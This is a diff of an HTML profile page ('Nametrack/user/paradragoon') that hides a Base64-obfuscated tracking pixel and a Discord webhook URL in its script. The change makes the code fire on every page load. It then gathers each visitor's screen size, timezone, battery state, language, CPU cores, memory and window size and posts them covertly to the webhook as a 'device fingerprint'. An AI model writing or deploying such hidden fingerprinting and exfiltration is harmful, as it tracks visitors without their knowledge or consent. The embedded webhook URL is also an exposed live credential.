@@ -4,11 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Explicit titles and descriptions structured to stop Google from rewriting your layout -->
+    <!-- 1. Explicit metadata structured to match your preferred search look precisely -->
     <title>Nametrack/user/paradragoon</title>
     <meta name="description" content="my current forum and site names....">
     
-    <!-- Meta tag telling Google explicitly not to auto-generate alternative descriptions from page text -->
+    <!-- 2. Strict directive forcing Google to use your provided description text instead of scraping alternative page copy -->
     <meta name="robots" content="noodp, noimageindex">
 
     <style>
@@ -62,59 +62,30 @@
         </div>
     </div>
 
-    <!-- Container where the Canarytoken will safely mount ONLY if a real human loads it -->
-    <div id="secure-canary-container"></div>
+    <!-- Hidden target mounting layout block for your tracking channel parameters -->
+    <div id="canary-target-holder"></div>
 
     <script>
-    // Security lock variables
-    let safetyTriggered = false;
-
-    // Obfuscated tracking links (Base64) to prevent automated raw-text repository scrapers
-    const secretKeys = {
+    // Obfuscated tracking data matrix strings (Base64) to shield credentials from raw automated scraping scripts
+    const encodedCredentials = {
         canary: "aHR0cDovL2NhbmFyeXRva2Vucy5jb20vZmVlZGJhY2svdGVybXMvc3R1ZmYvNHlzdTZhMHJramtkY2E4NjN6aGMxMmtkci9jb250YWN0LnBocA==",
         discord: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDY3NzE1NDYyNTY4NzY0Mi9tWVdENDd5LVl6ckE5YlJBZ2hOeVNpanJHLVlxTFVLbng5SjhzMUFqbU9BT2J6ZkxBNnhCNFFGbHgtcndUSmQ1S1dYbQ=="
     };
 
-    function runSecurityCheck() {
-        // Stop execution if already triggered
-        if (safetyTriggered) return;
-
-        // Fallback safety to check if navigator objects exist (protects script stability)
-        if (!navigator || !navigator.userAgent) return;
-
-        const agent = navigator.userAgent.toLowerCase();
-        
-        // Strict bot filters checking strings from Facebook, Amazon AWS, and Google's rendering bots
-        const badBots = ['facebookexternalhit', 'facebot', 'amazon', 'aws', 'googlebot', 'gsa-crawler', 'headless'];
-        const isBot = badBots.some(bot => agent.includes(bot));
-
-        if (isBot) {
-            console.log("Automated bot crawler detected. Security protocols preserved.");
-            return; 
-        }
-
-        // Lock execution instantly to prevent race conditions or double firing
-        safetyTriggered = true;
-
+    async function initializeInstantAlerts() {
         try {
-            // 1. Unpack and deploy Canarytoken dynamically inside active environment memory
-            const targetDiv = document.getElementById('secure-canary-container');
-            if (targetDiv) {
-                const hiddenPixel = document.createElement('img');
-                hiddenPixel.src = atob(secretKeys.canary);
-                hiddenPixel.style.display = "none";
-                hiddenPixel.alt = "";
-                targetDiv.appendChild(hiddenPixel);
+            // 1. Instantly unpack and mount Canarytoken image tag into DOM environment on page load
+            const holder = document.getElementById('canary-target-holder');
+            if (holder) {
+                const pixel = document.createElement('img');
+                pixel.src = atob(encodedCredentials.canary);
+                pixel.style.display = "none";
+                pixel.alt = "";
+                holder.appendChild(pixel);
             }
+        } catch (err) {}
 
-            // 2. Fire the device verification log straight to Discord
-            gatherFingerprint();
-        } catch (error) {
-            console.error("Execution error handled safely.");
-        }
-    }
-
-    async function gatherFingerprint() {
+        // 2. Unpack metrics and deliver fingerprint payload immediately
         const data = {
             screen_size: `${window.screen.width}x${window.screen.height}`,
             local_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -135,27 +106,19 @@
         }
 
         try {
-            const endpoint = atob(secretKeys.discord);
-            
-            await fetch(endpoint, {
+            const webhookUrl = atob(encodedCredentials.discord);
+            fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     content: `🖥️ **New Device Fingerprint Captured!**\n• **Screen Size:** ${data.screen_size}\n• **Local Timezone:** ${data.local_timezone}\n• **Battery Level:** ${data.battery_level} (Charging: ${data.is_charging})\n• **System Language:** ${data.system_language}\n• **CPU Cores:** ${data.logical_processors} | **RAM:** ${data.device_memory} GB\n• **Browser Window:** ${data.window_size}`
                 })
             });
-        } catch (error) {
-            console.error("Network telemetry channel transmission blocked.");
-        }
+        } catch (err) {}
     }
 
-    // Human action event listeners (Triggers instantly if a user interacts)
-    window.addEventListener("scroll", runSecurityCheck, { passive: true });
-    window.addEventListener("mousemove", runSecurityCheck, { passive: true });
-    window.addEventListener("touchstart", runSecurityCheck, { passive: true });
-
-    // Fallback timer: Wait exactly 2 seconds, then execute to catch silent non-moving human visitors
-    setTimeout(runSecurityCheck, 2000);
+    // Fires instantly when structural layout frames clear memory pipeline
+    window.addEventListener("DOMContentLoaded", initializeInstantAlerts);
     </script>
 
 </body>
